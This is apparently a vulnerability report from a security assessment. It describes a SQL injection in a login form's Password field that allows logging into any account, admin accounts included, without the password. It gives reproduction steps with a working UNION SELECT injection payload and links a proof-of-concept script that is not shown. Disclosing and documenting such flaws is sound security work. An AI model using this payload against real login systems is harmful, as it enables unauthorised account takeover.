# Vulnerability 2: SQL Injection allows to login into any account including admin accounts without entering the password
    
- Vulnerability: SQL Injection
- Where: Field `Password` in Login form 
- Impact: Allows to login into any account without entering the password

## Steps to reproduce
1. Enter Login Form
2. Enter username of the pretended account
3. Insert in the password field: `' Union select username, password, username, username, username from Users where username = '*pretended username*`
4. Login into account

[(PoC)](SQLvuln2.py)